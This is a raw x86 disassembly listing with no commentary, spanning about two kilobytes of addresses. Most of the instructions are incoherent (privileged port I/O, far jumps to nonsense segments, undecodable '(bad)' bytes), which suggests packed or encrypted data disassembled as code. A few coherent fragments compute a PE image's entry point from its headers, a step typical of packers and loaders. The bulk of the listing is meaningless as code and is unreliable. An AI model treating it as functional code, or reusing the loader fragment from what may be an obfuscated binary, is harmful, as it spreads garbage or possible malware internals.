  41d7e0:	les    ebx,FWORD PTR [esi+0x27]
  41d7e3:	sar    BYTE PTR [eax+0x2e],cl
  41d7e6:	aam    0xee
  41d7e8:	pop    eax
  41d7e9:	fs mov edx,ebx
  41d7ec:	sahf   
  41d7ed:	jb     0x41d773
  41d7ef:	dec    edi
  41d7f0:	mov    ebp,0x2e7ebe20
  41d7f5:	out    dx,eax
  41d7f6:	xor    eax,DWORD PTR [eax]
  41d7f8:	sbb    ecx,ebx
  41d7fa:	push   ebp
  41d7fb:	les    edx,FWORD PTR [edx+ecx*2]
  41d7fe:	das    
  41d7ff:	inc    eax
  41d800:	sbb    DWORD PTR [esi],esp
  41d802:	test   DWORD PTR [edi],0x5e68975c
  41d808:	popa   
  41d809:	int3   
  41d80a:	pop    ss
  41d80b:	(bad)  
  41d80d:	xchg   ecx,eax
  41d80e:	jae    0x41d83c
  41d810:	mov    ecx,0x43125cd5
  41d815:	in     eax,0x62
  41d817:	mov    ebp,0xbffb28ce
  41d81c:	faddp  st(3),st
  41d81e:	imul   esi,DWORD PTR [edi+esi*8-0x4d],0x26f35b67
  41d826:	push   ss
  41d827:	imul   eax,DWORD PTR [ebp-0x5a],0xdd98261a
  41d82e:	into   
  41d82f:	out    dx,eax
  41d830:	jecxz  0x41d80e
  41d832:	out    0xb4,eax
  41d834:	sbb    edx,DWORD PTR [edi-0x63f9e2de]
  41d83a:	push   ds
  41d83b:	inc    eax
  41d83c:	push   ebx
  41d83d:	rol    esp,1
  41d83f:	xchg   BYTE PTR [edx+0x1dc77784],dl
  41d845:	mov    dl,0xff
  41d847:	icebp  
  41d848:	push   cs
  41d849:	jl     0x41d891
  41d84b:	and    DWORD PTR [ebp+0x341a1526],ecx
  41d851:	inc    esp
  41d852:	jl     0x41d8bc
  41d854:	js     0x41d83e
  41d856:	add    eax,DWORD PTR ds:0x7b507c18
  41d85c:	add    eax,0xc2e7a6cd
  41d861:	xor    eax,0x2afc3561
  41d866:	lahf   
  41d867:	dec    dh
  41d869:	jl     0x41d8d9
  41d86b:	cld    
  41d86c:	ficom  DWORD PTR [eax+0x5e4bacb4]
  41d872:	cmp    eax,0x8ce3c0e4
  41d877:	push   es
  41d878:	xchg   si,ax
  41d87a:	bound  edi,QWORD PTR [esi+0x5a]
  41d87d:	xchg   ebp,eax
  41d87e:	mov    esp,0xda37bb8a
  41d883:	call   FWORD PTR gs:[edx+0x10]
  41d887:	aad    0xf9
  41d889:	cmp    edx,edi
  41d88b:	or     DWORD PTR [ebp+ecx*1+0x5],ebp
  41d88f:	push   esi
  41d890:	cmp    DWORD PTR [edx+edx*1],0xb9985dc9
  41d897:	inc    ecx
  41d898:	in     eax,0xf9
  41d89a:	cwde   
  41d89b:	xchg   ebp,eax
  41d89c:	aaa    
  41d89d:	add    BYTE PTR [ebp+0x30e29c08],bl
  41d8a3:	ins    DWORD PTR es:[edi],dx
  41d8a4:	cwde   
  41d8a5:	(bad)
  41d8a9:	hlt    
  41d8aa:	jp     0x41d880
  41d8ac:	add    al,0x60
  41d8ae:	fld    DWORD PTR [esi+0x68]
  41d8b1:	add    DWORD PTR [ebp+0x79],0x47
  41d8b5:	fwait
  41d8b6:	mov    bh,0xa0
  41d8b8:	jp     0x41d8f2
  41d8ba:	adc    DWORD PTR [ebp-0x10],ebp
  41d8bd:	xchg   edi,eax
  41d8be:	adc    cl,BYTE PTR [ebx-0x2127e7a3]
  41d8c4:	ror    DWORD PTR [ebp-0x74153c9a],0xb0
  41d8cb:	dec    edi
  41d8cc:	add    ebp,edx
  41d8ce:	loopne 0x41d8a7
  41d8d0:	addr16 and eax,0x89b844c0
  41d8d6:	xor    BYTE PTR [edx+0x7671b4f2],0xc2
  41d8dd:	mov    esi,DWORD PTR [eax]
  41d8df:	sahf   
  41d8e0:	ds pusha 
  41d8e2:	push   ebx
  41d8e3:	icebp  
  41d8e4:	aad    0x7f
  41d8e6:	xchg   edi,eax
  41d8e7:	imul   edx,DWORD PTR [ebx],0xfd5601b1
  41d8ed:	lods   eax,DWORD PTR ds:[esi]
  41d8ee:	inc    ecx
  41d8ef:	pop    eax
  41d8f0:	sub    eax,0x4d11844f
  41d8f5:	mov    ah,0xda
  41d8f7:	push   cs
  41d8f8:	mov    DWORD PTR [edx-0x16305453],esp
  41d8fe:	dec    ebp
  41d8ff:	shl    BYTE PTR [ebp+0x22],cl
  41d902:	enter  0xa7b5,0x40
  41d906:	pop    esi
  41d907:	ror    DWORD PTR [ebx-0x74e7dbac],cl
  41d90d:	jl     0x41d933
  41d90f:	sbb    al,0x3
  41d911:	ret    0xcf13
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422538
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x8bcbd9bc,eax
  41d941:	jo     0x41d9c2
  41d943:	dec    ebp
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x14bf1818],bh
  41d94c:	in     eax,0x2e
  41d94e:	jmp    0xad20:0xaba107a2
  41d955:	pop    esi
  41d956:	mov    ds:0x6cba3ff2,al
  41d95b:	mov    ah,0x41
  41d95d:	sbb    BYTE PTR [ebx-0x6f],ah
  41d960:	jnp    0x41d9aa
  41d962:	lea    esp,[eax-0x53]
  41d965:	jmp    0x41d96d
  41d967:	mov    ecx,0x6bbb0dce
  41d96c:	mov    ebx,DWORD PTR [ebx-0x61]
  41d96f:	fiadd  WORD PTR [esi+0x7a4063]
  41d975:	cmc    
  41d976:	sub    DWORD PTR [esi],0x4703495a
  41d97c:	pop    eax
  41d97d:	jmp    FWORD PTR [ecx-0x5b]
  41d980:	sbb    cl,BYTE PTR [eax-0x4774f785]
  41d986:	dec    eax
  41d987:	nop
  41d988:	jge    0x41d9cd
  41d98a:	dec    esi
  41d98b:	nop
  41d98c:	and    eax,0xf909b70a
  41d991:	xor    BYTE PTR [edi+0x45],bh
  41d994:	dec    ecx
  41d995:	stos   BYTE PTR es:[edi],al
  41d996:	in     al,dx
  41d997:	xchg   ebp,eax
  41d998:	jo     0x41d990
  41d99a:	add    BYTE PTR [ebx+0x6f],bh
  41d99d:	adc    edx,DWORD PTR [esi-0x6da687ef]
  41d9a3:	pop    ebx
  41d9a4:	js     0x41d9aa
  41d9a6:	sub    al,0x30
  41d9a8:	and    esp,DWORD PTR [ecx-0x60]
  41d9ab:	test   DWORD PTR [ecx+eax*1+0x185e46d],0x93b9e276
  41d9b6:	lods   al,BYTE PTR ds:[esi]
  41d9b7:	jb     0x41d96a
  41d9b9:	popf   
  41d9ba:	and    BYTE PTR [ecx+0x14],al
  41d9bd:	cli    
  41d9be:	push   0x9b8953a8
  41d9c3:	push   0x68
  41d9c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9c6:	and    esp,DWORD PTR [ebx+eiz*8-0x4]
  41d9ca:	jbe    0x41d9f6
  41d9cc:	cmp    eax,0x3d6845cb
  41d9d1:	pop    eax
  41d9d2:	push   edi
  41d9d3:	cmp    DWORD PTR [edi],esi
  41d9d5:	mov    al,ds:0x2913d2de
  41d9da:	js     0x41da32
  41d9dc:	repnz push ebx
  41d9de:	or     DWORD PTR [ecx+0x11],edi
  41d9e1:	xchg   BYTE PTR [edx],ch
  41d9e3:	mov    edx,0xbad40b1d
  41d9e8:	outs   dx,BYTE PTR ds:[esi]
  41d9e9:	lods   eax,DWORD PTR ds:[esi]
  41d9ea:	invd   
  41d9ec:	fistp  QWORD PTR [eax+0x4]
  41d9ef:	adc    al,0x44
  41d9f1:	imul   esi,ebx,0x82c918c9
  41d9f7:	addr16 out 0x32,al
  41d9fa:	inc    ecx
  41d9fb:	or     bh,BYTE PTR [edx+esi*1-0x74e25e37]
  41da02:	inc    ebp
  41da03:	pop    eax
  41da04:	xchg   edx,eax
  41da05:	sub    BYTE PTR [ebx+0x7f5f079],bh
  41da0b:	dec    ebp
  41da0c:	into   
  41da0d:	mov    edx,0xdf37b529
  41da12:	xor    edx,DWORD PTR [eax+ebp*2+0x3265a870]
  41da19:	inc    esp
  41da1a:	mov    al,ds:0x858b0255
  41da1f:	add    dh,dl
  41da21:	inc    edi
  41da22:	ins    DWORD PTR es:[edi],dx
  41da23:	jmp    0x44d01916
  41da28:	xchg   BYTE PTR [esi+0x39282f22],dl
  41da2e:	adc    eax,0xf57127a6
  41da33:	pop    cx
  41da35:	outs   dx,DWORD PTR ds:[esi]
  41da36:	pop    edx
  41da37:	pop    ebp
  41da38:	mov    bl,0x37
  41da3a:	push   0xc9b2a34b
  41da3f:	jmp    0x265f:0xff67a3a5
  41da46:	mov    ecx,0xeaeca054
  41da4b:	cmp    edi,ebx
  41da4d:	xchg   edx,eax
  41da4e:	int    0xba
  41da50:	retf   0x45cc
  41da53:	ja     0x41da1a
  41da55:	dec    ebx
  41da56:	pop    ebp
  41da57:	jbe    0x41da20
  41da59:	std    
  41da5a:	es jg  0x41da42
  41da5d:	ret    0xee22
  41da60:	stos   DWORD PTR es:[edi],eax
  41da61:	pop    esp
  41da62:	inc    ebx
  41da63:	sahf   
  41da64:	cld    
  41da65:	mov    eax,ds:0x91ccea9b
  41da6a:	in     eax,dx
  41da6b:	cwde   
  41da6c:	(bad)  [edi-0x31]
  41da6f:	jg     0x41da7c
  41da71:	fucom  st(5)
  41da73:	sahf   
  41da74:	inc    ebx
  41da75:	and    edx,ecx
  41da77:	sbb    BYTE PTR [ebp-0x7bc3b908],al
  41da7d:	mov    ebp,0x8fa9b48
  41da82:	mov    cl,0x5f
  41da84:	adc    eax,0xb9b13e54
  41da89:	inc    ecx
  41da8a:	or     eax,0x6928ec3
  41da8f:	in     eax,dx
  41da90:	mov    ch,0x98
  41da92:	clc    
  41da93:	int    0x94
  41da95:	adc    BYTE PTR [edi-0x379fd693],dh
  41da9b:	fsubp  st(3),st
  41da9d:	cmp    bl,BYTE PTR [ebx]
  41da9f:	fisubr DWORD PTR [edx+0x62324613]
  41daa5:	lods   al,BYTE PTR ds:[esi]
  41daa6:	adc    ebp,DWORD PTR [esi]
  41daa8:	int3   
  41daa9:	dec    edi
  41daaa:	scas   eax,DWORD PTR es:[edi]
  41daab:	scas   al,BYTE PTR es:[edi]
  41daac:	outs   dx,BYTE PTR ds:[esi]
  41daad:	popf   
  41daae:	cmp    eax,DWORD PTR [eax]
  41dab0:	rcr    BYTE PTR [ecx-0x3],0x9e
  41dab4:	push   ebx
  41dab5:	fwait
  41dab6:	add    eax,0x7fd0af8d
  41dabb:	mov    al,ds:0x432e2ad2
  41dac0:	mov    ebp,0x23af1a68
  41dac5:	in     eax,dx
  41dac6:	add    al,0x19
  41dac8:	mov    dl,0x5a
  41daca:	jg     0x41db19
  41dacc:	rol    esp,1
  41dace:	cmc    
  41dacf:	or     eax,0x2e4eda0
  41dad4:	outs   dx,DWORD PTR ds:[esi]
  41dad5:	push   eax
  41dad6:	cmovge edi,DWORD PTR [eax+0x43bf7957]
  41dadd:	loop   0x41db3b
  41dadf:	cli    
  41dae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dae1:	push   eax
  41dae2:	scas   eax,DWORD PTR es:[edi]
  41dae3:	pop    es
  41dae4:	outs   dx,DWORD PTR ds:[esi]
  41dae5:	mov    al,ds:0x79c119eb
  41daea:	aas    
  41daeb:	loope  0x41dad1
  41daed:	das    
  41daee:	(bad)  
  41daf0:	sahf   
  41daf1:	sub    eax,0xe9d5f5ee
  41daf6:	mov    ds:0xaa341adb,al
  41dafb:	out    dx,al
  41dafc:	mov    ebx,0x972aeb15
  41db01:	cmp    al,0x6a
  41db03:	mov    bl,0x35
  41db05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db06:	mov    edx,DWORD PTR [eax-0x31b140ec]
  41db0c:	push   esi
  41db0d:	cdq    
  41db0e:	mov    edx,0x5b7dc8d2
  41db13:	clc    
  41db14:	sbb    DWORD PTR [ecx-0x4f],ecx
  41db17:	jno    0x41db51
  41db19:	adc    al,0xee
  41db1b:	jnp    0x41db30
  41db1d:	nop
  41db1e:	nop
  41db1f:	mov    ds:0x83889659,al
  41db24:	cs scas al,BYTE PTR es:[edi]
  41db26:	mov    ds:0x50de01bc,eax
  41db2b:	sub    eax,0x17ff3e47
  41db30:	lds    ebp,FWORD PTR [eax+ecx*8]
  41db33:	mov    dl,0x9e
  41db35:	mov    BYTE PTR [ebx-0x12],ah
  41db38:	aam    0x98
  41db3a:	cmp    eax,0xab4a3178
  41db3f:	test   ecx,ebx
  41db41:	inc    edx
  41db42:	mov    ebx,0xa9956b6f
  41db47:	xor    DWORD PTR [ebx],ebx
  41db49:	xchg   DWORD PTR [edi],esp
  41db4b:	cld    
  41db4c:	xor    eax,0xb73b6f9f
  41db51:	push   ecx
  41db52:	imul   ebx,DWORD PTR [edx+eax*1+0x69e557b4],0x26
  41db5a:	adc    ebp,edi
  41db5c:	or     BYTE PTR ds:0xea2d6457,ch
  41db62:	inc    BYTE PTR [esp+0xeca4688]
  41db69:	sbb    DWORD PTR [esi*4-0x3bc45368],0xffffffa9
  41db71:	je     0x41db87
  41db73:	add    eax,0xf0a8e7b6
  41db78:	lock sbb bh,dh
  41db7b:	push   edi
  41db7c:	pop    esi
  41db7d:	aaa    
  41db7e:	push   edx
  41db7f:	shr    DWORD PTR [esi],0xe
  41db82:	bound  ebx,QWORD PTR [esp+esi*4-0x10]
  41db86:	test   ch,bh
  41db88:	xlat   BYTE PTR ds:[ebx]
  41db89:	xor    esi,ebx
  41db8b:	mov    dl,0xde
  41db8d:	(bad)  
  41db8e:	cmp    BYTE PTR [edx+eiz*4-0x35],ch
  41db92:	out    0xb0,al
  41db94:	mov    esi,0x3f519849
  41db99:	pop    esi
  41db9a:	pandn  mm5,QWORD PTR [edx-0x77a36949]
  41dba1:	sbb    ebp,edi
  41dba3:	cmp    BYTE PTR [esp+eax*8],ch
  41dba6:	arpl   WORD PTR [ecx],si
  41dba8:	imul   esi,DWORD PTR [ecx-0x10],0x7c3c5d47
  41dbaf:	cmp    BYTE PTR [eax-0x19],0x51
  41dbb3:	loope  0x41db77
  41dbb5:	repnz dec edi
  41dbb7:	mov    ah,0xff
  41dbb9:	pop    esi
  41dbba:	je     0x41dc16
  41dbbc:	pop    esp
  41dbbd:	dec    esp
  41dbbe:	enter  0x2007,0x8d
  41dbc2:	mov    ebp,0xb664bbd4
  41dbc7:	pushf  
  41dbc8:	cmp    BYTE PTR [ebp-0x78d54004],dh
  41dbce:	xor    eax,0xadbe6874
  41dbd3:	mov    WORD PTR [esi],ds
  41dbd5:	jecxz  0x41db6e
  41dbd7:	inc    eax
  41dbd8:	push   edi
  41dbd9:	cmp    ebp,DWORD PTR [edx+ecx*4-0x6b]
  41dbdd:	mov    DWORD PTR [ebx+0x5780846e],edx
  41dbe3:	sub    DWORD PTR ss:[edi+eax*2],edi
  41dbe7:	sub    al,0xfd
  41dbe9:	shl    BYTE PTR [ebp+0x4ab96e6d],0x93
  41dbf0:	jbe    0x41dbaa
  41dbf2:	mov    ss,WORD PTR [edx+ecx*8-0x2651ebc3]
  41dbf9:	leave  
  41dbfa:	call   0x9f0f:0x66d0bb03
  41dc01:	push   edi
  41dc02:	test   DWORD PTR [eax],0x52934a81
  41dc08:	shr    DWORD PTR ss:[edi],0x2c
  41dc0c:	repnz shl BYTE PTR [ebp-0x6228336b],cl
  41dc13:	mov    ebp,0xd4c4a336
  41dc18:	or     DWORD PTR [esi+0x6fa6f182],ebp
  41dc1e:	or     eax,0x29361de
  41dc23:	dec    ecx
  41dc24:	and    eax,0x25d71c90
  41dc29:	xor    DWORD PTR [edi+0x392da5e1],esi
  41dc2f:	gs mov bl,0x37
  41dc32:	jns    0x41dcb1
  41dc34:	scas   al,BYTE PTR es:[edi]
  41dc35:	adc    eax,0xfbda44f2
  41dc3a:	ficomp DWORD PTR [esi]
  41dc3c:	mov    ds:0x83ab0567,al
  41dc41:	xor    dh,ch
  41dc43:	lods   eax,DWORD PTR ds:[esi]
  41dc44:	and    al,0x95
  41dc46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc47:	sbb    al,0x8b
  41dc49:	mov    di,0xb226
  41dc4d:	dec    eax
  41dc4e:	in     al,dx
  41dc4f:	sub    ah,BYTE PTR [edx-0x24]
  41dc52:	xchg   ebp,eax
  41dc53:	push   edi
  41dc54:	ds out 0x54,eax
  41dc57:	push   ds
  41dc58:	xor    bl,BYTE PTR [ecx]
  41dc5a:	mov    bh,0xe9
  41dc5c:	pop    eax
  41dc5d:	sub    ax,sp
  41dc60:	mov    ah,0x9d
  41dc62:	push   ss
  41dc63:	xchg   bl,dh
  41dc65:	mov    fs,WORD PTR [esi-0x4]
  41dc68:	inc    esp
  41dc69:	mov    cl,0x9d
  41dc6b:	retf   
  41dc6c:	and    ecx,DWORD PTR [edx+eax*4-0x25f7b73b]
  41dc73:	sbb    dh,ah
  41dc75:	(bad)  
  41dc76:	xor    ebp,ebp
  41dc78:	xor    eax,0x3e5924ac
  41dc7d:	mov    es,WORD PTR [ecx+0x36]
  41dc80:	scas   al,BYTE PTR es:[edi]
  41dc81:	push   ecx
  41dc82:	popa   
  41dc83:	pop    ebp
  41dc84:	js     0x41dc4d
  41dc86:	test   eax,0x8afe74f7
  41dc8b:	mov    bh,0xae
  41dc8d:	push   ds
  41dc8e:	inc    ecx
  41dc8f:	mov    bl,0x3d
  41dc91:	sahf   
  41dc92:	sub    eax,0x9f272e42
  41dc97:	clc    
  41dc98:	ja     0x41dcab
  41dc9a:	push   0x30a0e7ac
  41dc9f:	cmc    
  41dca0:	(bad)  
  41dca1:	adc    ch,BYTE PTR [ecx-0x5]
  41dca4:	and    dh,BYTE PTR [edi-0x8]
  41dca7:	sbb    dh,BYTE PTR [ecx]
  41dca9:	lahf   
  41dcaa:	pop    ebx
  41dcab:	jmp    0x41dcdf
  41dcad:	and    eax,0xd40710d5
  41dcb2:	push   esi
  41dcb3:	sub    eax,0x5b0f8083
  41dcb8:	xor    al,0x2f
  41dcba:	loop   0x41dc4a
  41dcbc:	push   ecx
  41dcbd:	aas    
  41dcbe:	cmpxchg DWORD PTR [ebx+esi*1-0x72],ebx
  41dcc3:	in     eax,0xe
  41dcc5:	or     bh,BYTE PTR [eax]
  41dcc7:	aad    0xcb
  41dcc9:	lods   eax,DWORD PTR ds:[esi]
  41dcca:	and    esi,DWORD PTR [eax+0x14]
  41dccd:	or     BYTE PTR [edi-0x551773b6],0x45
  41dcd4:	ror    BYTE PTR [edx-0x47b8d66f],1
  41dcda:	xor    bh,dl
  41dcdc:	mov    bl,0xba
  41dcde:	lods   eax,DWORD PTR ds:[esi]
  41dcdf:	jb     0x41dcd8
  41dce1:	repz pop edx
  41dce3:	or     eax,0x184df785
  41dce8:	out    dx,eax
  41dce9:	ret    0x531d
  41dcec:	cli    
  41dced:	out    dx,al
  41dcee:	stos   DWORD PTR es:[edi],eax
  41dcef:	xchg   esp,eax
  41dcf0:	(bad)  [ecx-0x45]
  41dcf3:	xor    BYTE PTR [ebx+0x4e58bae4],dl
  41dcf9:	div    BYTE PTR [ecx]
  41dcfb:	mov    esi,0x6c24448d
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xffffff97
  41dd5b:	stc    
  41dd5c:	mov    cl,0xb0
  41dd5e:	and    al,BYTE PTR [edi+0x16]
  41dd61:	sbb    BYTE PTR [edx+edx*1+0x5ac81818],bh
  41dd68:	jo     0x41dd9b
  41dd6a:	cmp    eax,0xd4d1d574
  41dd6f:	push   edi
  41dd70:	imul   ecx,DWORD PTR [edi],0x34
  41dd73:	scas   al,BYTE PTR es:[edi]
  41dd74:	in     al,0x93
  41dd76:	loopne 0x41ddea
  41dd78:	loope  0x41dd6b
  41dd7a:	out    0x94,al
  41dd7c:	sub    BYTE PTR [ecx+0x6a],ah
  41dd7f:	into   
  41dd80:	out    dx,al
  41dd81:	adc    edx,DWORD PTR [ecx]
  41dd83:	int    0x6f
  41dd85:	xchg   DWORD PTR [ebx+0x49],ebp
  41dd88:	test   DWORD PTR [eax],edx
  41dd8a:	scas   eax,DWORD PTR es:[edi]
  41dd8b:	imul   edx,esp,0xdd94b6a9
  41dd91:	and    DWORD PTR [esi],0xffffff97
  41dd94:	bound  ecx,QWORD PTR [edx]
  41dd96:	sub    ebx,DWORD PTR [ecx]
  41dd98:	mov    esi,0x73f664cb
  41dd9d:	pushf  
  41dd9e:	xchg   esp,eax
  41dd9f:	gs das 
  41dda1:	sti    
  41dda2:	mov    ah,0xa3
  41dda4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dda5:	mov    ss,WORD PTR [esi+0x48c04ad0]
  41ddab:	mov    eax,0x47ddbb9e
  41ddb0:	mov    dh,0xf1
  41ddb2:	jne    0x41dda7
  41ddb4:	shl    BYTE PTR [edx+0x4c6f27c9],1
  41ddba:	lods   eax,DWORD PTR ds:[esi]
  41ddbb:	mov    esi,0x5513cb7d
  41ddc0:	xchg   ecx,eax
  41ddc1:	push   ss
  41ddc2:	repnz cs push edi
  41ddc5:	loopne 0x41de25
  41ddc7:	xchg   ebp,eax
  41ddc8:	xchg   esi,eax
  41ddc9:	mov    ds:0x56886b30,eax
  41ddce:	pop    esp
  41ddcf:	es mov esp,0xe538468b
  41ddd5:	adc    bl,BYTE PTR [si]
  41ddd8:	mov    al,ds:0xccd6b47f
  41dddd:	stc    
  41ddde:	jno    0x41dde6
  41dde0:	stos   BYTE PTR es:[edi],al
  41dde1:	shl    bl,1
  41dde3:	ret    
  41dde4:	repz std 
  41dde6:	sbb    DWORD PTR [esi-0x3aa80782],esi
  41ddec:	mov    ch,0x87
  41ddee:	rcl    ecx,1
  41ddf0:	add    DWORD PTR ds:[edx+0x69135791],esp
  41ddf7:	push   edi
  41ddf8:	adc    DWORD PTR [edx],ecx
  41ddfa:	xchg   ecx,eax
  41ddfb:	mov    ds:0x22349cba,al
  41de00:	dec    eax
  41de01:	out    dx,eax
  41de02:	(bad)  
  41de03:	pop    ecx
  41de04:	mov    ebx,0x223af04d
  41de09:	mov    fs,WORD PTR [esi+ebp*1+0x79b07c89]
  41de10:	mul    al
  41de12:	and    BYTE PTR [eax+0x71],dh
  41de15:	ret    
  41de16:	pop    ds
  41de17:	push   ecx
  41de18:	(bad)  
  41de19:	cmp    BYTE PTR [edi+ecx*1-0x7d3b5b3f],cl
  41de20:	ret    0xb97b
  41de23:	call   0x8c47:0x6897af5b
  41de2a:	rcr    DWORD PTR [edx+0x1c329f70],cl
  41de30:	mov    edi,0x226030f8
  41de35:	or     eax,esi
  41de37:	enter  0x8aca,0x69
  41de3b:	push   ebp
  41de3c:	retf   
  41de3d:	add    DWORD PTR [ebp-0x721a9a16],edi
  41de43:	add    al,0x75
  41de45:	inc    esi
  41de46:	push   ss
  41de47:	data16 in al,dx
  41de49:	and    BYTE PTR [edx+0x6e],bh
  41de4c:	enter  0x5984,0x9b
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	pop    ebp
  41de52:	pop    ebp
  41de53:	push   cs
  41de54:	shl    DWORD PTR ds:0x9243e41e,cl
  41de5a:	jge    0x41de50
  41de5c:	repz xchg esi,eax
  41de5e:	sub    esp,DWORD PTR [ebp+0x4c]
  41de61:	sub    al,0xd9
  41de63:	(bad)  
  41de64:	pop    ss
  41de65:	test   eax,0x97c7e70b
  41de6a:	ins    DWORD PTR es:[edi],dx
  41de6b:	xor    eax,DWORD PTR es:[eax+0x48]
  41de6f:	(bad)  
  41de71:	cmp    eax,0xcd2b188c
  41de76:	xchg   edx,eax
  41de77:	mov    eax,ds:0x39f6621b
  41de7c:	mov    edx,fs
  41de7e:	sub    bl,BYTE PTR [esi-0x23d122b7]
  41de84:	les    edx,FWORD PTR ss:[ecx]
  41de87:	jle    0x41deec
  41de89:	xor    cl,BYTE PTR [edx-0x39]
  41de8c:	cmp    al,0x67
  41de8e:	adc    al,0x2a
  41de90:	mov    esp,0x60e88ff9
  41de95:	or     BYTE PTR [esi+0x20681bcb],0x40
  41de9c:	fs dec ebp
  41de9e:	jmp    0x4b6f:0x87024e8d
  41dea5:	jbe    0x41de7f
  41dea7:	lods   al,BYTE PTR ds:[esi]
  41dea8:	sbb    dh,dh
  41deaa:	imul   edi,DWORD PTR [edi+0x2b20c179],0xde0e7815
  41deb4:	lea    esi,[ebp-0x1c]
  41deb7:	shr    DWORD PTR [edx],1
  41deb9:	xor    ch,ch
  41debb:	(bad)  
  41debc:	jns    0x41df3d
  41debe:	(bad)  
  41debf:	out    0xbd,al
  41dec1:	sbb    DWORD PTR [edi+0x44],edi
  41dec4:	inc    edx
  41dec5:	xchg   edi,eax
  41dec6:	and    ch,BYTE PTR [ecx]
  41dec8:	jg     0x41de8a
  41deca:	sub    al,0x18
  41decc:	stc    
  41decd:	push   ebp
  41dece:	stos   DWORD PTR es:[edi],eax
  41decf:	scas   eax,DWORD PTR es:[edi]
  41ded0:	inc    ebp
  41ded1:	shl    DWORD PTR [ebp+0x2],1
  41ded4:	lods   eax,DWORD PTR ds:[esi]
  41ded5:	dec    edi
  41ded6:	mov    eax,ds:0x868121c
  41dedb:	sahf   
  41dedc:	inc    ebp
  41dedd:	inc    ecx
  41dede:	inc    eax
  41dedf:	lea    esp,[edi]
  41dee1:	xchg   edi,eax
  41dee2:	mov    dl,0xba
  41dee4:	int    0xcc
  41dee6:	enter  0x39ba,0x41
  41deea:	daa    
  41deeb:	and    eax,DWORD PTR [ebp+edx*4-0x2]
  41deef:	in     al,0x4b
  41def1:	push   edx
  41def2:	mov    WORD PTR [edi-0xf554c1],ds
  41def8:	and    DWORD PTR [esi],eax
  41defa:	test   dl,ah
  41defc:	cmp    eax,0x905b4b61
  41df01:	mov    ebx,0x7ebbc17e
  41df06:	sub    BYTE PTR [edi+0x672ca4e7],dl
  41df0c:	cmp    eax,0xdca27983
  41df11:	adc    bh,0x1c
  41df14:	loop   0x41df48
  41df16:	test   BYTE PTR [edi],dl
  41df18:	jo     0x41defd
  41df1a:	pop    esp
  41df1b:	enter  0x408e,0xbb
  41df1f:	mov    ds:0x2852322a,eax
  41df24:	jmp    0x41ded6
  41df26:	push   0xa27adbc2
  41df2b:	cmp    bl,BYTE PTR [edi-0x343c1914]
  41df31:	cmp    dh,BYTE PTR [edx+0xf]
  41df34:	ds (bad) 
  41df36:	ss repz gs icebp 
  41df3a:	mov    dh,0x1f
  41df3c:	dec    eax
  41df3d:	mov    eax,ds:0xf6a24f1e
  41df42:	sar    BYTE PTR [eax+esi*2+0x6b],1
  41df46:	xchg   esp,eax
  41df47:	stc    
  41df48:	mov    dh,0xa2
  41df4a:	pop    ecx
  41df4b:	pop    ecx
  41df4c:	repnz cmp eax,0x48f4bc9d
  41df52:	mov    ds:0x9f98bbf6,eax
  41df57:	cmp    DWORD PTR [edx],ecx
  41df59:	or     al,0x98
  41df5b:	push   0xc6ec2637
  41df60:	mov    ah,0xdb
  41df62:	cld    
  41df63:	cmc    
  41df64:	loop   0x41df1a
  41df66:	call   0x1098e987
  41df6b:	aas    
  41df6c:	add    ch,bl
  41df6e:	stc    
  41df6f:	mov    ss,WORD PTR [ecx-0x55]
  41df72:	adc    DWORD PTR [edi],ebp
  41df74:	xchg   esp,eax
  41df75:	or     cl,cl
  41df77:	cld    
  41df78:	xchg   esp,eax
  41df79:	fstp   QWORD PTR [edi-0x210c9a22]
  41df7f:	adc    BYTE PTR [eax],dh
  41df81:	jo     0x41df2a
  41df83:	adc    ecx,esi
  41df85:	in     eax,0x42
  41df87:	neg    bh
  41df89:	(bad)  
  41df8a:	cmp    eax,0x6e0108fd
  41df8f:	jns    0x41dff1
  41df91:	(bad)  
  41df93:	jle    0x41dfcf
  41df95:	push   ss
  41df96:	aaa    
  41df97:	outs   dx,DWORD PTR ds:[esi]
  41df98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df99:	imul   ebx,DWORD PTR [ebx],0x66
  41df9c:	mov    dh,0xb
  41df9e:	xchg   esp,eax
  41df9f:	jle    0x41e012
  41dfa1:	ds pop edx
  41dfa3:	adc    al,0xf9
  41dfa5:	fs ja  0x41df6b
  41dfa8:	test   al,0xbc
  41dfaa:	shl    BYTE PTR [eax-0xd],cl
  41dfad:	jp     0x41df42
  41dfaf:	sub    DWORD PTR [edx-0x677465b5],0xffffffe0
  41dfb6:	loop   0x41dff2
